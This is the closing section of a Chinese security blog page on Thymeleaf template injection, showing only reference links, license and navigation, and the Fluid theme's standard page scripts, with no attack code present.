<li><a target="_blank" rel="noopener" href="https://blog.csdn.net/CPLASF_/article/details/110189503">springmvc源码-参数解析</a></li>
<li><a target="_blank" rel="noopener" href="https://www.cnpanda.net/sec/1063.html">Thymeleaf SSTI 分析以及最新版修复的 Bypass</a></li>
</ul>

              
            </div>
            <hr/>
            <div>
              <div class="post-metas my-3">
  
  
</div>


              
  

  <div class="license-box my-3">
    <div class="license-title">
      <div>Thymeleaf模板注入</div>
      <div>http://example.com/2022/11/26/Thymeleaf模板注入/</div>
    </div>
    <div class="license-meta">
      
        <div class="license-meta-item">
          <div>作者</div>
          <div>Mechoy</div>
        </div>
      
      
        <div class="license-meta-item license-meta-date">
          <div>发布于</div>
          <div>2022年11月26日</div>
        </div>
      
      
      <div class="license-meta-item">
        <div>许可协议</div>
        <div>
          
            
            
              <a target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
              <span class="hint--top hint--rounded" aria-label="BY - 署名">
                <i class="iconfont icon-by"></i>
              </span>
              </a>
            
          
        </div>
      </div>
    </div>
    <div class="license-icon iconfont"></div>
  </div>



              
                <div class="post-prevnext my-3">
                  <article class="post-prev col-6">
                    
                    
                      <a href="/2023/03/27/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" title="Java反序列化">
                        <i class="iconfont icon-arrowleft"></i>
                        <span class="hidden-mobile">Java反序列化</span>
                        <span class="visible-mobile">上一篇</span>
                      </a>
                    
                  </article>
                  <article class="post-next col-6">
                    
                    
                      <a href="/2022/09/03/Java%E5%8A%A8%E6%80%81%E4%BB%A3%E7%90%86/" title="Java动态代理">
                        <span class="hidden-mobile">Java动态代理</span>
                        <span class="visible-mobile">下一篇</span>
                        <i class="iconfont icon-arrowright"></i>
                      </a>
                    
                  </article>
                </div>
              
            </div>

            
          </article>
        </div>
      </div>
    </div>

    <div class="side-col d-none d-lg-block col-lg-2">
      
  <aside class="sidebar" style="margin-left: -1rem">
    <div id="toc">
  <p class="toc-header"><i class="iconfont icon-list"></i>&nbsp;目录</p>
  <div class="toc-body" id="toc-body"></div>
</div>



  </aside>


    </div>
  </div>
</div>





  



  



  



  



  






    

    
      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
      </a>
    

    
      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
     aria-hidden="true">
  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
    <div class="modal-content">
      <div class="modal-header text-center">
        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
          <span aria-hidden="true">&times;</span>
        </button>
      </div>
      <div class="modal-body mx-3">
        <div class="md-form mb-5">
          <input type="text" id="local-search-input" class="form-control validate">
          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
        </div>
        <div class="list-group" id="local-search-result"></div>
      </div>
    </div>
  </div>
</div>

    

    
  </main>

  <footer>
    <div class="footer-inner">
  
    <div class="footer-content">
       <a href="https://mechoy.github.io" target="_blank" rel="nofollow noopener"><span>Mechoy</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
    </div>
  
  
  
  
</div>

  </footer>

  <!-- Scripts -->
  
  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />

  <script>
    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
    NProgress.start()
    window.addEventListener('load', function() {
      NProgress.done();
    })
  </script>


<script  src="https://lib.baomitu.com/jquery/3.6.0/jquery.min.js" ></script>
<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
<script  src="/js/events.js" ></script>
<script  src="/js/plugins.js" ></script>


  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
  <script>
    (function (window, document) {
      var typing = Fluid.plugins.typing;
      var subtitle = document.getElementById('subtitle');
      if (!subtitle || !typing) {
        return;
      }
      var text = subtitle.getAttribute('data-typed-text');
      
        typing(text);
      
    })(window, document);
  </script>






  
    <script  src="/js/img-lazyload.js" ></script>
  




  
<script>
  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.18.0/tocbot.min.js', function() {
    var toc = jQuery('#toc');
    if (toc.length === 0 || !window.tocbot) { return; }
    var boardCtn = jQuery('#board-ctn');
    var boardTop = boardCtn.offset().top;

    window.tocbot.init({
      tocSelector     : '#toc-body',
      contentSelector : '.markdown-body',
      headingSelector : CONFIG.toc.headingSelector || 'h1,h2,h3,h4,h5,h6',
      linkClass       : 'tocbot-link',
      activeLinkClass : 'tocbot-active-link',
      listClass       : 'tocbot-list',
      isCollapsedClass: 'tocbot-is-collapsed',
      collapsibleClass: 'tocbot-is-collapsible',
      collapseDepth   : CONFIG.toc.collapseDepth || 0,
      scrollSmooth    : true,
      headingsOffset  : -boardTop
    });
    if (toc.find('.toc-list-item').length > 0) {
      toc.css('visibility', 'visible');
    }
  });
</script>


  <script>
  (function() {
    var enableLang = CONFIG.code_language.enable && CONFIG.code_language.default;
    var enableCopy = CONFIG.copy_btn;
    if (!enableLang && !enableCopy) {
      return;
    }

    function getBgClass(ele) {
      return Fluid.utils.getBackgroundLightness(ele) >= 0 ? 'code-widget-light' : 'code-widget-dark';
    }

    var copyTmpl = '';
    copyTmpl += '<div class="code-widget">';
    copyTmpl += 'LANG';
    copyTmpl += '</div>';
    jQuery('.markdown-body pre').each(function() {
      var $pre = jQuery(this);
      if ($pre.find('code.mermaid').length > 0) {
        return;
      }
      if ($pre.find('span.line').length > 0) {
        return;
      }

      var lang = '';

      if (enableLang) {
        lang = CONFIG.code_language.default;
        if ($pre[0].children.length > 0 && $pre[0].children[0].classList.length >= 2 && $pre.children().hasClass('hljs')) {
          lang = $pre[0].children[0].classList[1];
        } else if ($pre[0].getAttribute('data-language')) {
          lang = $pre[0].getAttribute('data-language');
        } else if ($pre.parent().hasClass('sourceCode') && $pre[0].children.length > 0 && $pre[0].children[0].classList.length >= 2) {
          lang = $pre[0].children[0].classList[1];
          $pre.parent().addClass('code-wrapper');
        } else if ($pre.parent().hasClass('markdown-body') && $pre[0].classList.length === 0) {
          $pre.wrap('<div class="code-wrapper"></div>');
        }
        lang = lang.toUpperCase().replace('NONE', CONFIG.code_language.default);
      }
      $pre.append(copyTmpl.replace('LANG', lang).replace('code-widget">',
        getBgClass($pre[0]) + (enableCopy ? ' code-widget copy-btn" data-clipboard-snippet><i class="iconfont icon-copy"></i>' : ' code-widget">')));

      if (enableCopy) {
        Fluid.utils.createScript('https://lib.baomitu.com/clipboard.js/2.0.10/clipboard.min.js', function() {
          var clipboard = new window.ClipboardJS('.copy-btn', {
            target: function(trigger) {
              var nodes = trigger.parentNode.childNodes;
              for (var i = 0; i < nodes.length; i++) {
                if (nodes[i].tagName === 'CODE') {
                  return nodes[i];
                }
              }
            }
          });
          clipboard.on('success', function(e) {
            e.clearSelection();
            e.trigger.innerHTML = e.trigger.innerHTML.replace('icon-copy', 'icon-success');
            setTimeout(function() {
              e.trigger.innerHTML = e.trigger.innerHTML.replace('icon-success', 'icon-copy');
            }, 2000);
          });
        });
      }
    });
  })();
</script>


  
<script>
  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/4.3.1/anchor.min.js', function() {
    window.anchors.options = {
      placement: CONFIG.anchorjs.placement,
      visible  : CONFIG.anchorjs.visible
    };
    if (CONFIG.anchorjs.icon) {
      window.anchors.options.icon = CONFIG.anchorjs.icon;
    }
    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
    var res = [];
    for (var item of el) {
      res.push('.markdown-body > ' + item.trim());
    }
    if (CONFIG.anchorjs.placement === 'left') {
      window.anchors.options.class = 'anchorjs-link-left';
    }
    window.anchors.add(res.join(', '));
  });
</script>


  
<script>
  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
    Fluid.plugins.fancyBox();
  });
</script>


  <script>Fluid.plugins.imageCaption();</script>

  <script  src="/js/local-search.js" ></script>





<!-- 主题的启动项，将它保持在最底部 -->
<!-- the boot of the theme, keep it at the bottom -->
<script  src="/js/boot.js" ></script>


  

  <noscript>
    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
  </noscript>
</body>
</html>
